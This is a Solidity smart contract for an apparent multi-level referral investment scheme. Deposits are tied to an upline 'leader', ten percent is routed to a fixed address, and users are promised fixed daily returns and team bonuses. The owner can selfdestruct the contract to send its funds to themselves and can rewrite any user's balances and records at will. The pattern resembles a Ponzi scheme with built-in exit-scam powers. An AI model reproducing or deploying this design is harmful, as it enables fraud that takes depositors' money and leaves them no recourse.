pragma solidity ^0.4.25;
import "./userBase.sol";
/****
 * 
 * The user interface transmits data for execution
 * 
 * 
****/
contract  UserInterface is UserBase{
    address constant insuranceAddress = 0x68171D0bb388406E1C50fA6Bd6b29e427a8AB918; //Safe address
    function() public  payable{}
    //User recharge and create interface, pass in superior leader address(_addr)
    function userAddInterface(address _addr) payable public statusIsOpen {
        userAddBase(msg.sender,_addr,msg.value);
        //Transfer ten percent to the safe
        insuranceAddress.transfer(msg.value * 1/10);
    }
    
    function userWithdrawal() external statusIsOpen WithdrawalSwitch {
        withdrawal();
    }
    
    /* this is owner  */
    //This is the user static interface,Pass in the player address
    function userStaticInterface() external {
        uint lastTime = lastStaticTime[msg.sender];
        require(now - lastTime > 1 days,"userStaticInterface error");
        if (now - lastTime > 30 days) {
            increasePlayerWalletAmount(msg.sender,players[msg.sender].playerBlance * 3/2000,1);  //202-11-06 edit
        } else {
            uint staticDays = (now - lastTime) / 86400;
            increasePlayerWalletAmount(msg.sender,(players[msg.sender].playerBlance * 3/2000) * staticDays,1);
        }
        lastStaticTime[msg.sender] = now;
    }
    
    //Manage the bonus allocation interface
    function userTeamGlobalInterface() external onlyOwner {
        require(now - lastGlobalTime > 1 days,"userTeamGlobalInterface error");
        if (teamGlobalList[0].length != 0) {  
            for(uint i = 0; i < 4; i++){
                for(uint c = 0; c < teamGlobalList[i].length; c++) {
                    globalTeamBase(teamGlobalList[i][c],i);
                }
            }
        }    
        lastGlobalTime = now;
        contractBlance = 0;
    }
    
   
    /** Here is the query interface **/
    //Invitation information Query
    function getUserInvitation() public view returns(address,uint) {
        return(
            players[msg.sender].playerLeaders,  //The superior
            team[msg.sender].teamCop[1].length //Direct recommended quantity
            
        );
    }
    
    //Methods for querying user information
    function getUserDataOwn() public view returns(uint,uint,uint,uint,uint,uint,uint,uint,bool) {
        uint playerMakeMoney = players[msg.sender].playerStaticMoney + players[msg.sender].playerTeamMoney + players[msg.sender].playerGlobalMoney;
        uint reMakeAmount;
        if (players[msg.sender].totalBlance != 0) {
            reMakeAmount = players[msg.sender].totalBlance - playerMakeMoney;
        }
        return (
            players[msg.sender].playerRank,
            team[msg.sender].userTeamGlobalLevel,
            players[msg.sender].playerStaticMoney,
            players[msg.sender].playerTeamMoney,
            players[msg.sender].playerGlobalMoney,
            reMakeAmount,
            players[msg.sender].playerBlance * 3/2000,
            players[msg.sender].playerWalletAmount,
            players[msg.sender].playerIsJoin
        );
    }
    
    function getUserDataTwo() public view returns(uint,uint,uint,uint,uint,uint) {
        return(
            contractBlance * 16/100,
            contractBlance,
            teamGlobalList[0].length,
            teamGlobalList[1].length,
            teamGlobalList[2].length,
            teamGlobalList[3].length
        );
    }
    
    function getUserDataThree() public view returns(uint,uint,uint,uint,uint,uint,uint) {
        return(
            team[msg.sender].teamCop[1].length,
            team[msg.sender].teamCop[2].length,
            team[msg.sender].teamCop[3].length,
            team[msg.sender].teamCop[4].length,
            team[msg.sender].teamCop[5].length,
            team[msg.sender].teamCop[6].length,
            team[msg.sender].userTeamTotalAmount
        );
    }
    
    function destroyContract() external onlyOwner {
        selfdestruct(msg.sender);
    }
    
    /** this owner   **/
    //add user data
    function setUserData(address _addr,
        uint _playerRank,
        uint _playerBlance,
        uint _totalBlance,
        uint _playerStaticMoney,
        uint _playerTeamMoney,
        uint _playerGlobalMoney,
        address _Leaders,
        bool _playerIsJoin,
        uint _userTeamLevel,
        uint _userTeamTotalAmount,
        uint _playerWalletAmount
        
        ) external onlyOwner {
        players[_addr] = Player(_playerRank, _playerBlance, _totalBlance, _playerWalletAmount, _playerStaticMoney, _playerTeamMoney, _playerGlobalMoney, _Leaders, _playerIsJoin);
        team[_addr].userTeamLevel = _userTeamLevel;
        team[_addr].userTeamTotalAmount = _userTeamTotalAmount;
        
    }
    //add usersttictime 
    function setLastStaticTime(address _addr, uint _time) external onlyOwner {
        lastStaticTime[_addr] = _time;
    }
    //add contractBlance
    function setContractBlance(uint _amount) external onlyOwner {
        contractBlance = _amount;
    }
    //add userTeam
    function setUserTeamArray(address _addr,uint _num,address _addrSub) external onlyOwner {
        team[_addr].teamCop[_num].push(_addrSub);
    }
    
    //huo qu xin xi
    function getUserAcount(address _addr) public view onlyOwner returns(uint playerRank,
        uint playerBlance, 
        uint totalBlance,
        uint playerWalletAmount,
        uint playerStaticMoney,
        uint playerTeamMoney,
        uint playerGlobalMoney,
        address playerLeaders,
        bool playerIsJoin,
        uint userTeamLevel,
        uint userTeamTotalAmoun) {
        address user = _addr;   
        return (
            players[user].playerRank,
            players[user].playerBlance,
            players[user].totalBlance,
            players[user].playerWalletAmount,
            players[user].playerStaticMoney,
            players[user].playerTeamMoney,
            players[user].playerGlobalMoney,
            players[user].playerLeaders,
            players[user].playerIsJoin,
            team[user].userTeamLevel,
            team[user].userTeamTotalAmount
        );
    } 
   
    
}